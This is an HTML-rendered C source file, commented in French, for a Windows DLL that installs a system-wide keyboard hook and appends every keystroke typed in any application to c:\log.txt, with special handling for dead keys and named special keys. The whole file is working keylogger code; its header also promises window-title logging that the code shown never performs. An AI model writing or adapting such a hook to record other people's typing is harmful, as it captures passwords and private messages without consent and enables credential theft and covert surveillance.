<html>
<head>
<title>dllmain.c.html</title>
</head>
<!-- Generated by SynEdit HTML exporter -->
<body text="#000000" bgcolor="#FFFFFF">
<pre>
<code><font  size=2 face="Courier New">
<font color="#0A246A"><i>//==============================================================================
// Hook Clavier Global Avec Gestion Des DEAD KEYS
//------------------------------------------------------------------------------
// Ce programme intercepte toutes les touches du clavier sur lesquelles vous
// tapez, quelle que soit l'application.
// Un fichier texte est cr&eacute;&eacute; (c:\log.txt) dans lequel vous trouverez le d&eacute;but
// et la fin du hook, les touches appuy&eacute;es et les titres des fen&ecirc;tres
// correspondantes.
//------------------------------------------------------------------------------
// Pour les &quot;experts&quot; :
// Dans la fonction de hook, on utilise la fonction ToAscii. Cette fonction
// g&egrave;re tr&egrave;s mal les DEAD KEYS. Les DEAD KEYS sont les caract&egrave;res qui doivent
// &ecirc;tre combin&eacute;s &agrave; un autre pour ne former qu'un ( ^ + e = &ecirc; ).
// Si on doit traiter une DEAD KEY, il est obligatoire d'utiliser une autre
// fonction. J'ai opt&eacute; pour GetKeyNameText ( )
// Important &eacute;galement, le fichier texte n'est pas constamment ouvert. Il n'est
// ouvert que lorsqu'on veut y &eacute;crire un caract&egrave;re puis on le referme. En effet,
// si notre programme n'est pas quitt&eacute; correctement, il se peut qu'il y ait des
// probl&egrave;mes pour r&eacute;ouvrir ce fichier. D'autant plus qu'on &eacute;crira pas assez vite
// pour mettre en d&eacute;faut cette fa&ccedil;on de faire.
//==============================================================================


//------------------------------------------------------------------------------
// INCLUDES
//------------------------------------------------------------------------------

    </i></font><font color="#008000">#include </font>&lt;windows.h&gt;            <font color="#0A246A"><i>// Header pour DevCpp

//------------------------------------------------------------------------------
// Constantes &amp; Macros
//------------------------------------------------------------------------------

    // A ajouter devant une fonction pour l'exporter ou l'importer
    </i></font><font color="#008000">#define </font>DLLEXPORT   <b>__declspec </b>(dllexport)
    <font color="#008000">#define </font>DLLIMPORT   <b>__declspec </b>(dllimport)

<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Variables Globales De La DLL
//------------------------------------------------------------------------------

    </i></font>HHOOK   HKEYBOARD;                      <font color="#0A246A"><i>// Hook Clavier
    </i></font>HINSTANCE HInst;                        <font color="#0A246A"><i>// Handle d'intance de la DLL
    </i></font><b>char    </b>LastWindowText[<font color="#800080">256</font>];            <font color="#0A246A"><i>// Nom de la fen&ecirc;tre actuelle
    </i></font><b>char    </b>FILENAME[] = <font color="#FF0000">&quot;c:\\log.txt&quot;</font>;     <font color="#0A246A"><i>// Chemin du log

//------------------------------------------------------------------------------
// Ecriture &agrave; la fin d'un fichier texte
//------------------------------------------------------------------------------

</i></font>DWORD myfprintf ( LPCVOID texte )
{
    HANDLE  logfic;                         <font color="#0A246A"><i>// Handle du fichier
    </i></font>DWORD   taille=<font color="#800080">0</font>;                       <font color="#0A246A"><i>// Nombre d'octets effectivement &eacute;crits
    
    // Ouverture et positionnement &agrave; la fin du fichier pour ajout
    </i></font>logfic = CreateFile ( FILENAME, GENERIC_WRITE, <font color="#800080">0</font>, <font color="#800080">0</font>, OPEN_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL );
    <b>if </b>( logfic != INVALID_HANDLE_VALUE )
    {
        SetFilePointer ( logfic, <font color="#800080">0</font>, <font color="#800080">0</font>, FILE_END );
        WriteFile ( logfic, texte, strlen(texte), &amp;taille, NULL );
        CloseHandle ( logfic );
    }
    <b>return </b>taille;
}

<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Retourne 0 si le caract&egrave;re est un DEAD CHAR (accent circonflexe, trema, etc ...)
//------------------------------------------------------------------------------

</i></font>BOOL is_dead_key ( <b>int </b>wparam )
{
    <b>unsigned int </b>code = MapVirtualKey ( wparam, <font color="#800080">2 </font>);

    <font color="#0A246A"><i>// Windows 95 retourne 0x8000, NT retourne 0x80000000
    </i></font><b>return </b>(code &amp; <font color="#800080">0x80008000</font>) ? TRUE : FALSE;
}

<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Fonctions execut&eacute;e lorsqu'on appuie sur une touche
//------------------------------------------------------------------------------
// lParam est compos&eacute; de 32 bits (de 31 &agrave; 0) :
// touche appuy&eacute;e   : bit 31 [FALSE] bit 30 [FALSE]
// touche maintenue : bit 31 [FALSE] bit 30 [TRUE]
// touche relach&eacute;e  : bit 31 [TRUE]  bit 30 [TRUE]
// scancode         : bit 23 au bit 16 inclus
//------------------------------------------------------------------------------

</i></font>LRESULT CALLBACK KeyboardProc ( <b>int </b>nCode,WPARAM wParam,LPARAM lParam )
{
    BYTE KeyState[<font color="#800080">256</font>];                 <font color="#0A246A"><i>// Etat des 256 touches du clavier
    </i></font><b>static </b>BOOL deadkey;                <font color="#0A246A"><i>// Est-ce qu'on a trait&eacute; une DEAD KEY
    </i></font>WORD Char=<font color="#800080">0</font>;                        <font color="#0A246A"><i>// Buffer pour la traduction de la touche (ToAscii)
    </i></font><b>char </b>nomTouche[<font color="#800080">256</font>];                <font color="#0A246A"><i>// Buffer pour la traduction de la touche (GetKeyNameText)

    // On ne fait rien dans ce cas (cf aide API)
    </i></font><b>if </b>( nCode &lt; <font color="#800080">0 </font>|| nCode == HC_NOREMOVE )
        <b>return </b>CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );

    <font color="#0A246A"><i>// Pour &eacute;viter les r&eacute;p&eacute;titions
    // Bit 30 : Sp&eacute;cifie l'&eacute;tat pr&eacute;c&eacute;dent de la touche (si TRUE, on passe notre chemin)
    </i></font><b>if </b>( ((DWORD)lParam &amp; <font color="#800080">1</font>&lt;&lt;<font color="#800080">30</font>) != FALSE )
        <b>return </b>CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
        
    <font color="#0A246A"><i>// Si c'est une DEAD KEY, on passe notre chemin
    </i></font><b>if </b>( is_dead_key ( (UINT) wParam ) )
    {
        deadkey = TRUE;
        myfprintf ( <font color="#FF0000">&quot;[DK]&quot; </font>);
        <b>return </b>CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
    }

    <b>switch</b>(wParam)
    {
    <b>case </b>VK_BACK    : myfprintf ( <font color="#FF0000">&quot;[BKSP]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x08
    </i></font><b>case </b>VK_TAB     : myfprintf ( <font color="#FF0000">&quot;[TAB]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x09
    </i></font><b>case </b>VK_RETURN  : myfprintf ( <font color="#FF0000">&quot;[ENTER]\r\n&quot; </font>);<b>break</b>;  <font color="#0A246A"><i>// 0x0D
    </i></font><b>case </b>VK_SHIFT   :                           <b>break</b>;  <font color="#0A246A"><i>// 0x10
    </i></font><b>case </b>VK_CONTROL : myfprintf ( <font color="#FF0000">&quot;[CTRL]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x11
    </i></font><b>case </b>VK_MENU    : myfprintf ( <font color="#FF0000">&quot;[ALT]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x12
    </i></font><b>case </b>VK_PAUSE   : myfprintf ( <font color="#FF0000">&quot;[PAUSE]&quot; </font>);  <b>break</b>;  <font color="#0A246A"><i>// 0x13
    </i></font><b>case </b>VK_CAPITAL :                           <b>break</b>;  <font color="#0A246A"><i>// 0x14
    </i></font><b>case </b>VK_ESCAPE  :                           <b>break</b>;  <font color="#0A246A"><i>// 0x1B
    </i></font><b>case </b>VK_PRIOR   : myfprintf ( <font color="#FF0000">&quot;[PGUP]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x21
    </i></font><b>case </b>VK_NEXT    : myfprintf ( <font color="#FF0000">&quot;[PGDN]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x22
    </i></font><b>case </b>VK_END     : myfprintf ( <font color="#FF0000">&quot;[END]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x23
    </i></font><b>case </b>VK_HOME    : myfprintf ( <font color="#FF0000">&quot;[HOME]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x24
    </i></font><b>case </b>VK_LEFT    : myfprintf ( <font color="#FF0000">&quot;[LEFT]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x25
    </i></font><b>case </b>VK_UP      : myfprintf ( <font color="#FF0000">&quot;[UP]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x26
    </i></font><b>case </b>VK_RIGHT   : myfprintf ( <font color="#FF0000">&quot;[RIGHT]&quot; </font>);  <b>break</b>;  <font color="#0A246A"><i>// 0x27
    </i></font><b>case </b>VK_DOWN    : myfprintf ( <font color="#FF0000">&quot;[DOWN]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x28
    </i></font><b>case </b>VK_SNAPSHOT: myfprintf ( <font color="#FF0000">&quot;[SNAP]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x2C
    </i></font><b>case </b>VK_INSERT  :                           <b>break</b>;  <font color="#0A246A"><i>// 0x2D
    </i></font><b>case </b>VK_DELETE  : myfprintf ( <font color="#FF0000">&quot;[DEL]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x2E
    </i></font><b>case </b>VK_LWIN    : myfprintf ( <font color="#FF0000">&quot;[LWIN]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x5B
    </i></font><b>case </b>VK_RWIN    : myfprintf ( <font color="#FF0000">&quot;[RWIN]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x5C
    </i></font><b>case </b>VK_APPS    : myfprintf ( <font color="#FF0000">&quot;[APPS]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x5D
    </i></font><b>case </b>VK_NUMPAD0 : myfprintf ( <font color="#FF0000">&quot;[NUM0]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x60
    </i></font><b>case </b>VK_NUMPAD1 : myfprintf ( <font color="#FF0000">&quot;[NUM1]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x61
    </i></font><b>case </b>VK_NUMPAD2 : myfprintf ( <font color="#FF0000">&quot;[NUM2]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x62
    </i></font><b>case </b>VK_NUMPAD3 : myfprintf ( <font color="#FF0000">&quot;[NUM3]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x63
    </i></font><b>case </b>VK_NUMPAD4 : myfprintf ( <font color="#FF0000">&quot;[NUM4]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x64
    </i></font><b>case </b>VK_NUMPAD5 : myfprintf ( <font color="#FF0000">&quot;[NUM5]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x65
    </i></font><b>case </b>VK_NUMPAD6 : myfprintf ( <font color="#FF0000">&quot;[NUM6]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x66
    </i></font><b>case </b>VK_NUMPAD7 : myfprintf ( <font color="#FF0000">&quot;[NUM7]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x67
    </i></font><b>case </b>VK_NUMPAD8 : myfprintf ( <font color="#FF0000">&quot;[NUM8]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x68
    </i></font><b>case </b>VK_NUMPAD9 : myfprintf ( <font color="#FF0000">&quot;[NUM9]&quot; </font>);   <b>break</b>;  <font color="#0A246A"><i>// 0x69
    </i></font><b>case </b>VK_MULTIPLY: myfprintf ( <font color="#FF0000">&quot;*&quot; </font>);        <b>break</b>;  <font color="#0A246A"><i>// 0x6A
    </i></font><b>case </b>VK_ADD     : myfprintf ( <font color="#FF0000">&quot;+&quot; </font>);        <b>break</b>;  <font color="#0A246A"><i>// 0x6B
    </i></font><b>case </b>VK_SUBTRACT: myfprintf ( <font color="#FF0000">&quot;-&quot; </font>);        <b>break</b>;  <font color="#0A246A"><i>// 0x6D
    </i></font><b>case </b>VK_DECIMAL : myfprintf ( <font color="#FF0000">&quot;.&quot; </font>);        <b>break</b>;  <font color="#0A246A"><i>// 0x6E
    </i></font><b>case </b>VK_DIVIDE  : myfprintf ( <font color="#FF0000">&quot;/&quot; </font>);        <b>break</b>;  <font color="#0A246A"><i>// 0x06
    </i></font><b>case </b>VK_F1      : myfprintf ( <font color="#FF0000">&quot;[F1]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x70
    </i></font><b>case </b>VK_F2      : myfprintf ( <font color="#FF0000">&quot;[F2]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x71
    </i></font><b>case </b>VK_F3      : myfprintf ( <font color="#FF0000">&quot;[F3]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x72
    </i></font><b>case </b>VK_F4      : myfprintf ( <font color="#FF0000">&quot;[F4]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x73
    </i></font><b>case </b>VK_F5      : myfprintf ( <font color="#FF0000">&quot;[F5]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x74
    </i></font><b>case </b>VK_F6      : myfprintf ( <font color="#FF0000">&quot;[F6]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x75
    </i></font><b>case </b>VK_F7      : myfprintf ( <font color="#FF0000">&quot;[F7]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x76
    </i></font><b>case </b>VK_F8      : myfprintf ( <font color="#FF0000">&quot;[F8]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x77
    </i></font><b>case </b>VK_F9      : myfprintf ( <font color="#FF0000">&quot;[F9]&quot; </font>);     <b>break</b>;  <font color="#0A246A"><i>// 0x78
    </i></font><b>case </b>VK_F10     : myfprintf ( <font color="#FF0000">&quot;[F10]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x79
    </i></font><b>case </b>VK_F11     : myfprintf ( <font color="#FF0000">&quot;[F11]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7A
    </i></font><b>case </b>VK_F12     : myfprintf ( <font color="#FF0000">&quot;[F12]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7B
    </i></font><b>case </b>VK_F13     : myfprintf ( <font color="#FF0000">&quot;[F13]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7C
    </i></font><b>case </b>VK_F14     : myfprintf ( <font color="#FF0000">&quot;[F14]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7D
    </i></font><b>case </b>VK_F15     : myfprintf ( <font color="#FF0000">&quot;[F15]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7E
    </i></font><b>case </b>VK_F16     : myfprintf ( <font color="#FF0000">&quot;[F16]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x7F
    </i></font><b>case </b>VK_F17     : myfprintf ( <font color="#FF0000">&quot;[F17]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x80
    </i></font><b>case </b>VK_F18     : myfprintf ( <font color="#FF0000">&quot;[F18]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x81
    </i></font><b>case </b>VK_F19     : myfprintf ( <font color="#FF0000">&quot;[F19]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x82
    </i></font><b>case </b>VK_F20     : myfprintf ( <font color="#FF0000">&quot;[F20]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x83
    </i></font><b>case </b>VK_F21     : myfprintf ( <font color="#FF0000">&quot;[F21]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x84
    </i></font><b>case </b>VK_F22     : myfprintf ( <font color="#FF0000">&quot;[F22]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x85
    </i></font><b>case </b>VK_F23     : myfprintf ( <font color="#FF0000">&quot;[F23]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x86
    </i></font><b>case </b>VK_F24     : myfprintf ( <font color="#FF0000">&quot;[F24]&quot; </font>);    <b>break</b>;  <font color="#0A246A"><i>// 0x87
    </i></font><b>case </b>VK_NUMLOCK :                           <b>break</b>;  <font color="#0A246A"><i>// 0x90
    </i></font><b>case </b>VK_ATTN    :                           <b>break</b>;  <font color="#0A246A"><i>// 0xF6
    </i></font><b>default</b>:
        <font color="#0A246A"><i>// On r&eacute;initialise notre tableau
        </i></font>memset ( KeyState, <font color="#800080">0</font>, <b>sizeof</b>(KeyState) );
        
        <b>if </b>( GetKeyboardState ( KeyState ) )
        {
            <font color="#0A246A"><i>// ce n'est pas une DEAD KEY, on peut utiliser ToAscii
            </i></font><b>if </b>( !deadkey )
            {
                ToAscii ( (UINT) wParam, (UINT) ((lParam &lt;&lt; <font color="#800080">8 </font>) &gt;&gt; <font color="#800080">24</font>), KeyState, &amp;Char, <font color="#800080">0 </font>);
                myfprintf ( &amp;Char );
            }
            <font color="#0A246A"><i>// sinon, on doit utiliser autre chose !
            </i></font><b>else
            </b>{
                GetKeyNameText ( lParam, nomTouche, <font color="#800080">256 </font>);
                myfprintf ( nomTouche );
                deadkey = FALSE;
            }
        }
        <b>break</b>;
    }

    <b>return </b>CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
}


<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Fonction principale d'Initialisation De La DLL
//------------------------------------------------------------------------------
// hinst  : l'instance de notre programme
// raison : pourquoi notre DLL est utilis&eacute;e
// reserv : non utilis&eacute;
// retourne vrai si l'op&eacute;ration s'est bien d&eacute;roul&eacute;
//------------------------------------------------------------------------------


</i></font>BOOL APIENTRY DllMain ( HINSTANCE hinst, DWORD raison, LPVOID reserv )
{
    <b>if </b>( raison == DLL_PROCESS_ATTACH )
        HInst = hinst;
    <b>return </b>TRUE;
}


<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Initialisation Du Hook Clavier                             FONCTION EXPORTEE
//------------------------------------------------------------------------------


</i></font><b>void </b>DLLEXPORT InitHook ( <b>void </b>)
{
    HKEYBOARD = SetWindowsHookEx ( WH_KEYBOARD, (HOOKPROC)KeyboardProc, HInst, <font color="#800080">0 </font>);
}


<font color="#0A246A"><i>//------------------------------------------------------------------------------
// Terminaison Des Hooks                                     FONCTION EXPORTEE
//------------------------------------------------------------------------------


</i></font><b>void </b>DLLEXPORT EndHook ( <b>void </b>)
{
    UnhookWindowsHookEx ( HKEYBOARD );
}


<font color="#0A246A"><i>//==============================================================================
// EOF
//==============================================================================

</i></font></font>
</code></pre>
</body>
</html>